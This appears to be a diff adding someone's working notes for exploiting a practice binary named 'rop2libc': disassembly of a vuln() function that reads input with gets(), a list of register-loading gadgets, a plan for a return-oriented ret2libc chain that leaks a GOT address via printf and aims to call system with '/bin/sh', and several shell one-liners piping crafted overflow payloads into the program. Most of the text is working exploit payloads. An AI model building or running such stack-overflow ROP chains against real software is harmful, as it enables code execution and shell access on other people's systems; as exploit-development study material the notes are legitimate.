@@ -1,0 +1,77 @@
+Vuln code
+------------------------------------------------------------------------
+000000000040057d <vuln>:
+  40057d:       55                      push   %rbp
+  40057e:       48 89 e5                mov    %rsp,%rbp
+  400581:       48 83 ec 40             sub    $0x40,%rsp
+  400585:       48 8d 45 c0             lea    -0x40(%rbp),%rax
+  400589:       48 89 c7                mov    %rax,%rdi
+  40058c:       e8 ef fe ff ff          callq  400480 <gets@plt>
+  400591:       48 8d 45 c0             lea    -0x40(%rbp),%rax
+  400595:       48 89 c6                mov    %rax,%rsi
+  400598:       bf 54 06 40 00          mov    $0x400654,%edi
+  40059d:       b8 00 00 00 00          mov    $0x0,%eax
+  4005a2:       e8 a9 fe ff ff          callq  400450 <printf@plt>
+  4005a7:       c9                      leaveq
+  4005a8:       c3                      retq
+
+00000000004005a9 <main>:
+  4005a9:       55                      push   %rbp
+  4005aa:       48 89 e5                mov    %rsp,%rbp
+  4005ad:       48 83 ec 10             sub    $0x10,%rsp
+  4005b1:       89 7d fc                mov    %edi,-0x4(%rbp)
+  4005b4:       48 89 75 f0             mov    %rsi,-0x10(%rbp)
+  4005b8:       b8 00 00 00 00          mov    $0x0,%eax
+  4005bd:       e8 bb ff ff ff          callq  40057d <vuln>
+  4005c2:       b8 00 00 00 00          mov    $0x0,%eax
+  4005c7:       c9                      leaveq
+  4005c8:       c3                      retq
+  4005c9:       0f 1f 80 00 00 00 00    nopl   0x0(%rax)
+
+Register gadgets
+------------------------------------------------------------------------
+  400610:       4c 89 ea                mov    %r13,%rdx
+* 400613:       4c 89 f6                mov    %r14,%rsi
+  400616:       44 89 ff                mov    %r15d,%edi
+  400619:       41 ff 14 dc             callq  *(%r12,%rbx,8)
+  40061d:       48 83 c3 01             add    $0x1,%rbx
+  400621:       48 39 eb                cmp    %rbp,%rbx
+  400624:       75 ea                   jne    400610 <__libc_csu_init+0x40>
+  400626:       48 83 c4 08             add    $0x8,%rsp
+* 40062a:       5b                      pop    %rbx
+  40062b:       5d                      pop    %rbp
+  40062c:       41 5c                   pop    %r12
+  40062e:       41 5d                   pop    %r13
+  400630:       41 5e                   pop    %r14
+  400632:       41 5f                   pop    %r15
+  400634:       c3                      retq
+
+
+Plan (maybe not used)
+------------------------------------------------------------------------
+-Do stack overflow in vuln(), setting RBP=BSS start and RIP=0x400585
+-Use gets() to read stack contents into the BSS, and return, with RSP=RBP, RBP=valid value from BSS, and RIP=0x40062a
+-Load RBX and R12 (for call), plus R14 and R15 (for function args), and return, with RSP moving up, RBP=value for next gadget, and RIP=0x400613
+-Load EDI and RSI from R15 and R14 before calling printf(0x400654, got_addr) and returning, with RSP moving up, RBP=valid value, and RIP=0x400585
+-[Python code inspecting everything to calculate libc addrs]
+-Do stack overflow in vuln(), setting RIP=0x40062a (SEND IN SYSTEM() ADDR and "/bin/sh" SO THE BELOW CAN USE THEM)
+-Load RBX and R12 (for call), plus R14 and R15 (for function args), and return, with RSP moving up, RBP=whatevs, and RIP=0x400613
+
+Exploit
+------------------------------------------------------------------------
+BSS start: 0x601048
+
+Go to vuln() again:
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x7d\x05\x40"; sleep 1; echo "hi"; } | ./rop2libc
+
+printf() controlled str:
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x34\x06\x40\x00\x00\x00\x00\x00\x2a\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x0013131313\x54\x06\x40\x00\x00\x00\x00\x00\x54\x06\x40\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00"; } | ./rop2libc
+											    Retaddr 0			    Retaddr 1			    RBX				    RBP				    R12				    R13	    R14				    R15				    Retaddr 2
+
+printf() controlled str, and then gets() into BSS:
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x34\x06\x40\x00\x00\x00\x00\x00\x2a\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x0013131313\x54\x06\x40\x00\x00\x00\x00\x00\x54\x06\x40\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x001313131314141414\x48\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x10\x60\x00\x00\x00\x00\x001313131314141414\x4c\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00"; sleep 1; echo -e "\xdd\xdd\xdd\xdd/bin/sh\x00"; } | ./rop2libc
+											    Retaddr 0			    Retaddr 1			    RBX				    RBP				    R12				    R13	    R14				    R15				    Retaddr 2			    Padding RBX				    RBP				    R12				    R13	    R14	    R15				    Retaddr 3			    Padding RBX				    RBP				    R12				    R13	    R14	    R15				    Retaddr 4
+
+printf() GOT, and then gets() into BSS:
+{ sleep 1; echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC\x34\x06\x40\x00\x00\x00\x00\x00\x2a\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x10\x60\x00\x00\x00\x00\x0013131313\x18\x10\x60\x00\x00\x00\x00\x00\x54\x06\x40\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x001313131314141414\x48\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00PPPPPPPP\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x48\x10\x60\x00\x00\x00\x00\x001313131314141414\x4c\x10\x60\x00\x00\x00\x00\x00\x13\x06\x40\x00\x00\x00\x00\x00"; sleep 1; echo -e "\xdd\xdd\xdd\xdd/bin/sh\x00"; } | ./rop2libc
+											    Retaddr 0			    Retaddr 1			    RBX				    RBP				    R12				    R13	    R14				    R15				    Retaddr 2			    Padding RBX				    RBP				    R12				    R13	    R14	    R15				    Retaddr 3			    Padding RBX				    RBP				    R12				    R13	    R14	    R15				    Retaddr 4
